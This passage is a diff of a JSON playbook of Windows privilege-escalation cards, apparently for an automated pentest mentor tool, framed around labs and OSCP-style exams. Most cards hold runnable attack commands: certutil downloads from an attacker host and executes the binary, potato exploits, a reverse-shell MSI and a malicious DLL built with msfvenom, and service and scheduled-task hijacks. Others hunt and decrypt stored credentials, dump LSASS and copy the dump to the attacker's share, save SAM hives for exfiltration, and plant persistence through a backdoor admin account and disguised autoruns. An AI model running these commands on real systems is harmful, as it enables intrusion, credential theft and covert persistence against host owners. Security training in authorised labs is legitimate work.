@@ -1,564 +1,1087 @@
 {
- "id": "windows_privesc_2026_09",
- "title": "Windows Privilege Escalation",
- "source": "Project-authored (obol-local). Common-knowledge Windows privilege-escalation methodology; independent expression, not derived from any third-party card set.",
- "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
- "actions": [
-  {
-   "id": "windows-enum",
-   "title": "Local Enumeration Sweep",
-   "hypothesis": "Follow the same principle used on Linux: let a scanner (winpeas) give you coverage, and let your own reasoning pick the winner. The usual findings in lab environments are misconfigured services, credentials left lying around, unquoted paths, and abusable token privileges. Kick off the scanner, but confirm the specific candidate by hand before you set up any exploit.",
-   "tool": "winpeas",
-   "tools": [
-    "winpeas"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "foothold.windows"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "privesc.leads",
-    "host.kernel",
-    "host.arch"
-   ],
-   "priority": 94,
-   "proves": "surfaces candidate local privilege-escalation avenues, the host kernel/version, and the host architecture",
-   "does_not_prove": "yields a local privilege-escalation lead only — it is not admin/root/SYSTEM until you prove that separately",
-   "report": {
-    "finding": "Local Privilege Escalation Vector",
-    "severity": "high"
-   },
-   "refs": [
-    "https://github.com/peass-ng/PEASS-ng",
-    "https://lolbas-project.github.io/"
-   ],
-   "commands": [
+  "id": "windows_privesc_2026_09",
+  "title": "Windows Privilege Escalation",
+  "source": "Project-authored (obol-local). Common-knowledge Windows privilege-escalation methodology; independent expression, not derived from any third-party card set.",
+  "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
+  "actions": [
     {
-     "tool": "winpeas",
-     "run": "certutil -urlcache -f http://{{lhost}}:8000/winPEASx64.exe wp.exe && wp.exe",
-     "note": "Host it on your own machine. This is the cmd form; switch to iwr when you are inside a PowerShell session."
+      "id": "windows-enum",
+      "title": "Local Enumeration Sweep",
+      "hypothesis": "Follow the same principle used on Linux: let a scanner (winpeas) give you coverage, and let your own reasoning pick the winner. The usual findings in lab environments are misconfigured services, credentials left lying around, unquoted paths, and abusable token privileges. Kick off the scanner, but confirm the specific candidate by hand before you set up any exploit.",
+      "tool": "winpeas",
+      "tools": [
+        "winpeas"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "privesc.leads",
+        "host.kernel",
+        "host.arch"
+      ],
+      "priority": 94,
+      "proves": "surfaces candidate local privilege-escalation avenues, the host kernel/version, and the host architecture",
+      "does_not_prove": "yields a local privilege-escalation lead only, it is not admin/root/SYSTEM until you prove that separately",
+      "report": {
+        "finding": "Local Privilege Escalation Vector",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/peass-ng/PEASS-ng",
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "winpeas",
+          "run": "certutil -urlcache -f http://{{lhost}}:8000/winPEASx64.exe wp.exe && wp.exe",
+          "note": "Host it on your own machine. This is the cmd form; switch to iwr when you are inside a PowerShell session."
+        },
+        {
+          "tool": "sh",
+          "run": "whoami /all && systeminfo && net localgroup administrators",
+          "note": "Your identity, the patch level (useful for kernel-CVE triage), and the list of who is already an administrator."
+        },
+        {
+          "tool": "sh",
+          "run": "cmdkey /list && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+          "note": "Saved credentials and autologon settings, these hand you passwords more often than you might expect."
+        }
+      ]
     },
     {
-     "tool": "sh",
-     "run": "whoami /all && systeminfo && net localgroup administrators",
-     "note": "Your identity, the patch level (useful for kernel-CVE triage), and the list of who is already an administrator."
+      "id": "seimpersonate",
+      "title": "SeImpersonatePrivilege (Potato Family)",
+      "hypothesis": "Service identities (IIS, MSSQL) nearly always carry SeImpersonatePrivilege, which lets them grab and impersonate a SYSTEM token - the whole potato lineage. The key to not wasting a run: MATCH THE POTATO TO THE WINDOWS BUILD UP FRONT. The wrong potato for the build fails with a cryptic \"the handle is invalid\", so read the build first and pick deliberately - GodPotato for Server 2012-2022 and Win8-11, PrintSpoofer when the spooler/named-pipe path is up (2016/2019/Win10), JuicyPotato only on legacy builds. Confirm the preconditions too: SeImpersonate present, x64, a writable staging dir.",
+      "tool": "godpotato",
+      "tools": [
+        "godpotato"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.windows_privilege"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 80,
+      "proves": "obtains SYSTEM access",
+      "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
+      "report": {
+        "finding": "SeImpersonatePrivilege Abuse (Potato)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/BeichenDream/GodPotato",
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "whoami /priv | findstr /i impersonate",
+          "note": "PRECONDITION: confirm SeImpersonatePrivilege (or SeAssignPrimaryToken) is actually present before anything else."
+        },
+        {
+          "tool": "sh",
+          "run": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
+          "note": "MATCH THE BUILD FIRST (this prevents the failure): Server 2012/2016/2019/2022 or Win8-11 -> GodPotato (broadest, most reliable). Spooler/named-pipe reachable on 2016/2019/Win10 -> PrintSpoofer. Only a legacy build (2008/2012, Win7) with the old COM path -> JuicyPotato. Picking the wrong one is what throws \"the handle is invalid\"."
+        },
+        {
+          "tool": "sh",
+          "run": "certutil -urlcache -f http://{{lhost}}:8000/GodPotato-NET4.exe gp.exe",
+          "note": "Drop the potato you chose for the build (served from your box). GodPotato is the safe default across modern Windows; substitute PrintSpoofer.exe / JuicyPotatoNG.exe if the build pointed you there."
+        },
+        {
+          "tool": "sh",
+          "run": "gp.exe -cmd \"cmd /c whoami > C:\\\\Windows\\\\Temp\\\\proof.txt\"",
+          "note": "Prove SYSTEM with a harmless write first, read it back, then fire your real payload. If it still errors here, the potato-troubleshoot card catches the build-mismatch case."
+        }
+      ]
     },
     {
-     "tool": "sh",
-     "run": "cmdkey /list && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
-     "note": "Saved credentials and autologon settings — these hand you passwords more often than you might expect."
+      "id": "potato-select",
+      "title": "Potato Failed — Pick the Right One",
+      "tool": "PrintSpoofer",
+      "tools": [
+        "PrintSpoofer",
+        "GodPotato",
+        "JuicyPotatoNG"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.potato"
+      ],
+      "produces": [
+        "advice.potato"
+      ],
+      "priority": 70,
+      "hypothesis": "A SeImpersonate potato that errors (\"the handle is invalid\", a CoGetInstanceFromIStorage failure) is the wrong potato for this build - NOT a dead end, the privilege is still yours. Best practice is to match the build up front (see the SeImpersonate card); this card is the recovery when it failed anyway. Re-pick by version: GodPotato/PrintSpoofer for 2016/2019/2022 and Win10+, JuicyPotato only on older builds. One of them lands SYSTEM.",
+      "proves": "nothing new; it points you at the potato that works on this build",
+      "does_not_prove": "that you lack the privilege — SeImpersonate/SeAssignPrimaryToken is what makes any of these work",
+      "report": {
+        "finding": "Token-impersonation technique mismatch",
+        "severity": "info"
+      },
+      "refs": [
+        "https://github.com/BeichenDream/GodPotato"
+      ],
+      "commands": [
+        {
+          "tool": "GodPotato",
+          "run": "GodPotato.exe -cmd \"cmd /c whoami\"",
+          "note": "The broadest modern choice: GodPotato works across Windows Server 2012-2022 and Win8-11. `nt authority\\system` means SYSTEM."
+        },
+        {
+          "tool": "PrintSpoofer",
+          "run": "PrintSpoofer.exe -i -c cmd",
+          "note": "PrintSpoofer when the spooler/named-pipe path is available (2016/2019/Win10). Clean and reliable."
+        },
+        {
+          "tool": "JuicyPotatoNG",
+          "run": "JuicyPotatoNG.exe -t * -p cmd.exe",
+          "note": "Only on older builds where the classic COM path still works; on 2019+ use GodPotato/PrintSpoofer instead."
+        }
+      ]
+    },
+    {
+      "id": "unquoted-service-path",
+      "title": "Unquoted Service Path",
+      "hypothesis": "When a service's binary path contains spaces and is not quoted (C:\\Program Files\\My App\\svc.exe), Windows attempts C:\\Program.exe, then C:\\Program Files\\My.exe, and so on in sequence. If you can write to any folder along that sequence, place an executable with the matching name and either restart the service or wait for the next reboot.",
+      "tool": "wmic",
+      "tools": [
+        "wmic",
+        "icacls"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.unquoted_service_path"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 76,
+      "proves": "obtains SYSTEM access",
+      "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
+      "report": {
+        "finding": "Unquoted Service Path",
+        "severity": "high"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v '\"'",
+          "note": "List auto-start services whose paths are unquoted and live outside C:\\Windows."
+        },
+        {
+          "tool": "sh",
+          "run": "icacls \"C:\\Program Files\\My App\"",
+          "note": "Confirm you actually have write access to the vulnerable folder before staging anything into it."
+        }
+      ]
+    },
+    {
+      "id": "weak-service-permissions",
+      "title": "Weak Service Permissions / Binary Replacement",
+      "hypothesis": "Being able to alter a service's configuration (SERVICE_CHANGE_CONFIG) or overwrite the executable it launches means you decide what runs as SYSTEM the next time it starts. accesschk locates these; from there, redirect binpath to your own command or swap out the binary.",
+      "tool": "accesschk",
+      "tools": [
+        "accesschk",
+        "sc"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.weak_service_permission"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 76,
+      "proves": "obtains SYSTEM access",
+      "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
+      "report": {
+        "finding": "Weak Service Permissions",
+        "severity": "high"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "accesschk",
+          "run": "accesschk.exe -uwcqv {{user}} * /accepteula",
+          "note": "The services your account is allowed to reconfigure."
+        },
+        {
+          "tool": "sh",
+          "run": "sc config {{service}} binpath= \"net localgroup administrators {{user}} /add\"",
+          "note": "Aim the service at a harmless but conclusive command, then sc stop/start it (or wait for a reboot if you cannot stop it)."
+        },
+        {
+          "tool": "sh",
+          "run": "icacls \"C:\\path\\to\\service.exe\"",
+          "note": "Alternatively, if the executable itself is writable, keep a backup and overwrite it with your payload."
+        }
+      ]
+    },
+    {
+      "id": "alwaysinstallelevated",
+      "title": "AlwaysInstallElevated",
+      "hypothesis": "When AlwaysInstallElevated is set to 1 in both HKLM and HKCU, every MSI you launch installs with SYSTEM rights. Build an MSI that creates an admin account or executes a command, run it, and you are done.",
+      "tool": "msfvenom",
+      "tools": [
+        "msfvenom",
+        "msiexec"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.always_install_elevated"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 78,
+      "proves": "obtains SYSTEM access",
+      "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
+      "report": {
+        "finding": "AlwaysInstallElevated Enabled",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "note": "Both keys have to read 1. Either one on its own gets you nowhere."
+        },
+        {
+          "tool": "msfvenom",
+          "run": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f msi -o setup.msi",
+          "note": "Build it on your own machine (the mentor can assemble this for you), upload it, then run: msiexec /i setup.msi /quiet"
+        }
+      ]
+    },
+    {
+      "id": "dpapi-secrets",
+      "title": "DPAPI Credential Decryption",
+      "hypothesis": "Saved credentials on Windows (RDP, scheduled tasks, browsers) are encrypted under DPAPI masterkeys, and those masterkeys are in turn protected by the user's password hash. Wherever you already have the user's password (or SYSTEM), the whole credential store can be decrypted, a dependable route to lateral credentials across the 0xdf corpus.",
+      "tool": "impacket-dpapi",
+      "tools": [
+        "impacket-dpapi",
+        "mimikatz"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "foothold.windows"
+      ],
+      "requires_any": [
+        "credential.available",
+        "access.system"
+      ],
+      "produces": [
+        "credential.plaintext",
+        "credential.candidate",
+        "credential.available"
+      ],
+      "priority": 66,
+      "proves": "recovers a plaintext password and candidate credentials",
+      "does_not_prove": "produces credential material only, it is not access until it successfully authenticates against a service",
+      "report": {
+        "finding": "Stored Credentials Recovered via DPAPI",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.thehacker.recipes/ad/movement/dpapi",
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "dir /a %APPDATA%\\Microsoft\\Credentials && dir /a %APPDATA%\\Microsoft\\Protect",
+          "note": "Locate the credential blobs and the GUIDs of their masterkeys. Every blob records the masterkey it needs inside its own contents."
+        },
+        {
+          "tool": "impacket-dpapi",
+          "run": "impacket-dpapi masterkey -file {{masterkey_file}} -sid {{user_sid}} -password '{{password}}'",
+          "note": "Unwrap the masterkey with the user's password. The on-box counterpart is mimikatz dpapi::masterkey."
+        },
+        {
+          "tool": "impacket-dpapi",
+          "run": "impacket-dpapi credential -file {{credential_blob}} -key {{masterkey_hex}}",
+          "note": "Decrypt the blob using the unwrapped key. RDP credentials, VPN credentials, and service passwords all turn up here."
+        },
+        {
+          "tool": "mimikatz",
+          "run": "mimikatz # dpapi::cred /in:C:\\Users\\{{user}}\\AppData\\Roaming\\Microsoft\\Credentials\\{{blob}}",
+          "note": "The on-box option for when you are executing as that user or as SYSTEM."
+        }
+      ]
+    },
+    {
+      "id": "stored-credentials",
+      "title": "Stored Credential Hunting (Windows)",
+      "hypothesis": "Windows tends to stockpile credentials: Credential Manager (cmdkey), autologon registry entries, unattend/sysprep answer files, saved RDP files, browser vaults, and remote-connection tools (mRemoteNG configs whose passwords are recoverable) all leak reusable secrets. On lab machines this pass is quick, easily scripted, and pays off again and again.",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "produces": [
+        "credential.candidate",
+        "credential.plaintext",
+        "credential.available",
+        "privesc.stored_credentials"
+      ],
+      "priority": 82,
+      "proves": "surfaces candidate credentials, a plaintext password, and a stored Windows credential lead",
+      "does_not_prove": "yields a local privilege-escalation lead only, it is not admin/root/SYSTEM until you prove that separately",
+      "report": {
+        "finding": "Stored Credentials in Cleartext/Recoverable Form",
+        "severity": "high"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cmdkey /list",
+          "note": "Saved credentials. If one is present: runas /savecred /user:{{user}} cmd.exe lets you use it without ever knowing the password."
+        },
+        {
+          "tool": "sh",
+          "run": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+          "note": "Autologon: DefaultUserName / DefaultPassword sitting in cleartext."
+        },
+        {
+          "tool": "sh",
+          "run": "dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml 2>nul",
+          "note": "Imaging answer files, they carry local admin passwords in cleartext. Check C:\\Windows\\Panther\\Unattend.xml as well."
+        },
+        {
+          "tool": "sh",
+          "run": "dir /s %APPDATA%\\..\\*mRemoteNG*confCons.xml 2>nul && dir %USERPROFILE%\\*.rdp",
+          "note": "mRemoteNG configs store passwords that are encrypted but recoverable via a static key; .rdp files reveal targets and usernames."
+        },
+        {
+          "tool": "sh",
+          "run": "dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login* 2>nul",
+          "note": "Browser vaults are DPAPI-protected, recover them with SharpChrome, or copy Login Data plus the Local State key and crack them offline."
+        },
+        {
+          "tool": "sh",
+          "run": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s",
+          "note": "PuTTY saved sessions store secrets in cleartext: a ProxyPassword/ProxyUsername pair, or a full plink command line with -pw '<pass>' <user>@<host>. obol extracts the credential straight from this output."
+        },
+        {
+          "tool": "sh",
+          "run": "reg query \"HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" /s 2>nul",
+          "note": "WinSCP stores session passwords obfuscated (not cleartext), flag them, then recover with a WinSCP password decoder / winscppasswd."
+        }
+      ]
+    },
+    {
+      "id": "windows-old-hives",
+      "title": "Windows.old / Registry-Hive Secret Dump",
+      "hypothesis": "A leftover C:\\windows.old (from an in-place upgrade) or a saved SAM/SYSTEM/SECURITY hive holds old local-account hashes, often a still-valid Administrator hash you can crack or pass-the-hash. With a foothold, pull or save the hives and run secretsdump offline.",
+      "tool": "impacket-secretsdump",
+      "tools": [
+        "impacket-secretsdump",
+        "reg"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows",
+        "access.shell",
+        "access.system"
+      ],
+      "produces": [
+        "credential.candidate",
+        "hash.ntlm",
+        "loot.files"
+      ],
+      "priority": 82,
+      "autonomy": "approve",
+      "proves": "local-account NTLM hashes recovered from windows.old or saved registry hives (SAM + SYSTEM [+ SECURITY])",
+      "does_not_prove": "a validated login, a recovered hash must still be cracked or passed against a live service to prove access",
+      "report": {
+        "finding": "Credential Exposure via windows.old / Backup Registry Hives",
+        "severity": "high"
+      },
+      "refs": [
+        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "dir /a C:\\ | findstr /i windows.old & dir C:\\windows.old\\Windows\\System32\\config\\",
+          "note": "Look for a leftover windows.old tree, the old SAM/SYSTEM/SECURITY live under ...\\Windows\\System32\\config."
+        },
+        {
+          "tool": "reg",
+          "run": "reg save HKLM\\SAM %TEMP%\\SAM.hive & reg save HKLM\\SYSTEM %TEMP%\\SYSTEM.hive & reg save HKLM\\SECURITY %TEMP%\\SECURITY.hive",
+          "note": "Or, once you hold the box (local admin/SYSTEM), save the LIVE hives, then exfil the three files to Kali."
+        },
+        {
+          "tool": "impacket-secretsdump",
+          "run": "impacket-secretsdump -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL",
+          "note": "Parse offline on Kali. Crack or pass-the-hash the recovered Administrator hash, then paste the result on Evidence."
+        },
+        {
+          "tool": "impacket-secretsdump",
+          "run": "impacket-secretsdump {{domain}}/{{user}}:'{{password}}'@{{target}}",
+          "note": "Or dump remotely when you already hold admin creds on the box."
+        }
+      ]
+    },
+    {
+      "id": "wesng-patch-gaps",
+      "title": "Missing-Patch Exploit Suggestions (wesng)",
+      "hypothesis": "Aging Windows hosts (particularly HTB-era 2008/2012/7) are frequently escalated through a missing patch rather than a misconfiguration. Feeding systeminfo output to Windows Exploit Suggester / wesng maps absent hotfixes to public exploits (MS16-032, MS15-051, Chimichurri, and so on). This is the arctic/grandpa workflow: enumerate the patches, match them, then exploit.",
+      "tool": "wesng",
+      "tools": [
+        "wesng"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "exploit.candidate",
+        "privesc.patch_gap"
+      ],
+      "priority": 70,
+      "proves": "surfaces a candidate exploit and a missing-patch privilege-escalation lead",
+      "does_not_prove": "yields a local privilege-escalation lead only, it is not admin/root/SYSTEM until you prove that separately",
+      "report": {
+        "finding": "Missing Security Patches with Public Exploits",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/bitsadmin/wesng"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "systeminfo",
+          "note": "Run this on the target. Capture the complete output on your side: systeminfo > sysinfo.txt, then bring it back."
+        },
+        {
+          "tool": "sh",
+          "run": "wesng sysinfo.txt",
+          "note": "Run on your own machine (pip install wesng; it refreshes its database automatically). Produces a ranked list of missing KBs tied to public exploits."
+        },
+        {
+          "tool": "sh",
+          "run": "python3 windows-exploit-suggester.py --update && python3 windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt",
+          "note": "The classic alternative (corpus arctic). Older, but well proven on 2008-era hosts."
+        }
+      ]
+    },
+    {
+      "id": "windows-persistence",
+      "title": "Windows Persistence (Post-Admin)",
+      "hypothesis": "Once you hold admin/SYSTEM, leave yourself a route back in: a local admin account you own, a scheduled task, or a Run key. Labs seldom need it, but longer engagements do, and it makes for a report-worthy note about detection gaps. Record and remove everything you deploy.",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "persistence.windows"
+      ],
+      "priority": 50,
+      "proves": "a re-entry mechanism was planted on the host, an owned account, scheduled task, or autorun key that survives a reboot",
+      "does_not_prove": "represents persistence setup context, record it and clean it up; it is not a new privilege level",
+      "report": {
+        "finding": "Persistence Mechanism Planted",
+        "severity": "informational"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "net user obol_supp 'Str0ng!Passw0rd' /add && net localgroup administrators obol_supp /add",
+          "note": "The textbook local-admin backdoor. Stands out in any user audit, acceptable in labs, noisy in real environments."
+        },
+        {
+          "tool": "sh",
+          "run": "schtasks /create /tn \"WindowsUpdateCheck\" /sc daily /st 09:00 /tr \"C:\\Windows\\Temp\\update.exe\" /ru SYSTEM",
+          "note": "A scheduled task that runs your binary as SYSTEM every day."
+        },
+        {
+          "tool": "sh",
+          "run": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\update.exe\"",
+          "note": "A Run key, it triggers at the next logon."
+        }
+      ]
+    },
+    {
+      "id": "lsass-dump-onbox",
+      "title": "On-Box LSASS Memory Dump",
+      "hypothesis": "LSASS keeps the credentials of every logged-on user in memory. With admin/SYSTEM you can dump its process using the built-in comsvcs.dll (nothing to upload) or procdump, ship the .dmp off the box, and parse it offline with pypykatz, recovering plaintext passwords, NT hashes, and Kerberos tickets for anyone signed in. This pairs well with remote secrets dumping for the times you only have a shell on the machine.",
+      "tool": "cmd",
+      "tools": [
+        "cmd",
+        "procdump",
+        "pypykatz",
+        "impacket-smbserver"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "credential.plaintext",
+        "credential.available",
+        "hash.ntlm",
+        "kerberos.tickets"
+      ],
+      "priority": 66,
+      "proves": "recovers a plaintext password, NTLM hashes, and Kerberos tickets",
+      "does_not_prove": "produces credential material only, it is not access until it successfully authenticates against a service",
+      "report": {
+        "finding": "Credentials Extractable from LSASS Memory",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/",
+        "https://github.com/skelsec/pypykatz"
+      ],
+      "commands": [
+        {
+          "tool": "powershell",
+          "run": "Get-Process lsass",
+          "note": "Grab the LSASS PID first, comsvcs MiniDump requires it. tasklist /svc will also show it."
+        },
+        {
+          "tool": "cmd",
+          "run": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full",
+          "note": "A built-in LOLBin dump, swap 672 for the real PID and run it from an elevated prompt. Nothing gets uploaded; comsvcs.dll MiniDump is a documented Windows capability. (Defender flags this exact string on current builds; fall back to procdump then.)"
+        },
+        {
+          "tool": "sh",
+          "run": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
+          "note": "The Sysinternals route for when comsvcs is blocked. Serve procdump from your own machine (see file-transfer)."
+        },
+        {
+          "tool": "impacket-smbserver",
+          "run": "impacket-smbserver -smb2support CompData .",
+          "note": "On YOUR machine: catch the dump. From the target: move C:\\Windows\\Temp\\lsass.dmp \\\\{{lhost}}\\CompData"
+        },
+        {
+          "tool": "pypykatz",
+          "run": "pypykatz lsa minidump lsass.dmp",
+          "note": "Parse it offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every captured session, no spraying needed, just reuse. The Windows-side equivalent is mimikatz sekurlsa::minidump followed by sekurlsa::logonpasswords."
+        }
+      ]
+    },
+    {
+      "id": "defense-enum",
+      "title": "Enumerate Endpoint Defenses",
+      "hypothesis": "Before running anything on the host, record which endpoint controls are active, PowerShell language mode, Microsoft Defender real-time state with its configured exclusion paths, and whether an AppLocker policy is applied. Knowing the posture up front keeps obol remote-first honest: if the box is locked down, prefer tooling that runs from Kali and stay off the host.",
+      "tool": "powershell",
+      "tools": [
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows",
+        "access.shell",
+        "access.system",
+        "access.admin"
+      ],
+      "produces": [
+        "defense.control"
+      ],
+      "priority": 55,
+      "scope": "oscp+",
+      "locus": "F",
+      "proves": "the host defensive posture: PowerShell language mode, whether Defender real-time protection is on, any configured Defender exclusion paths, and whether an AppLocker policy is enforced",
+      "does_not_prove": "that any control can be evaded, this is read-only situational awareness, not an exploit; it says nothing about a way past AMSI, AppLocker, WDAC, or Defender",
+      "report": {
+        "finding": "Endpoint Defensive Posture",
+        "severity": "informational"
+      },
+      "refs": [
+        "https://learn.microsoft.com/powershell/module/defender/get-mpcomputerstatus",
+        "https://learn.microsoft.com/powershell/module/applocker/get-applockerpolicy"
+      ],
+      "commands": [
+        {
+          "tool": "powershell",
+          "run": "$ExecutionContext.SessionState.LanguageMode",
+          "note": "FullLanguage vs ConstrainedLanguage. Constrained language mode is a lockdown signal worth recording before you try anything on the box."
+        },
+        {
+          "tool": "powershell",
+          "run": "Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled",
+          "note": "Whether Microsoft Defender and its real-time protection are running on this host."
+        },
+        {
+          "tool": "powershell",
+          "run": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
+          "note": "Any folders Defender is configured to skip. Situational awareness only, recorded, not acted on."
+        },
+        {
+          "tool": "powershell",
+          "run": "Get-AppLockerPolicy -Effective -Xml",
+          "note": "The effective AppLocker policy, if one is applied, which rule collections are enforced."
+        }
+      ]
+    },
+    {
+      "id": "windows-dll-hijack",
+      "title": "DLL Search-Order / Phantom DLL Hijack",
+      "phase": "escalate",
+      "hypothesis": "A privileged process that loads a DLL by name from a directory you can write, or looks for a DLL that is not there (a phantom DLL), will load yours and run it with its privileges. Windows searches a fixed order of directories; when a SYSTEM service looks in a writable folder first or for a missing DLL, you plant one and get its context on the next start. Find it with Procmon (a NAME NOT FOUND, or a load from a writable path), confirm the directory ACL, then drop a DLL whose entry point runs your payload.",
+      "tool": "procmon",
+      "tools": [
+        "procmon",
+        "msfvenom",
+        "icacls",
+        "sc"
+      ],
+      "requires_any": [
+        "privesc.weak_service_permission",
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 50,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM where a privileged process loads a DLL from a path you control",
+      "does_not_prove": "anything unless the load path is writable or the DLL is genuinely missing",
+      "report": {
+        "finding": "DLL search-order hijack to SYSTEM",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking"
+      ],
+      "commands": [
+        {
+          "tool": "sc",
+          "run": "sc qc {{service}}",
+          "note": "Confirm a third-party service runs as LocalSystem."
+        },
+        {
+          "tool": "procmon",
+          "run": "Procmon filter: Process is the service, Result is NAME NOT FOUND, Path ends with .dll",
+          "note": "Find a DLL it loads from a writable directory or cannot find at all."
+        },
+        {
+          "tool": "msfvenom",
+          "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators {{user}} /add\" -f dll -o {{dll_name}}.dll",
+          "note": "Build a DLL whose DllMain runs your payload on attach."
+        },
+        {
+          "tool": "cmd",
+          "run": "copy {{dll_name}}.dll \"{{dll_path}}\\{{dll_name}}.dll\" && sc stop {{service}} && sc start {{service}}",
+          "note": "Plant it with the expected name and restart the service to run as SYSTEM."
+        }
+      ]
+    },
+    {
+      "id": "windows-schtask-abuse",
+      "title": "Writable Scheduled-Task Abuse",
+      "phase": "escalate",
+      "hypothesis": "A scheduled task that runs as SYSTEM or an administrator and executes a program or script in a location you can write is a direct path to its privileges. Overwrite the file the task runs, then trigger it or wait for its schedule, and your code runs elevated. The tell is in schtasks /query /v: a SYSTEM task whose target you can write, or a task whose own ACL lets you edit it. Back up the original so the box still works afterward.",
+      "tool": "schtasks",
+      "tools": [
+        "schtasks",
+        "icacls"
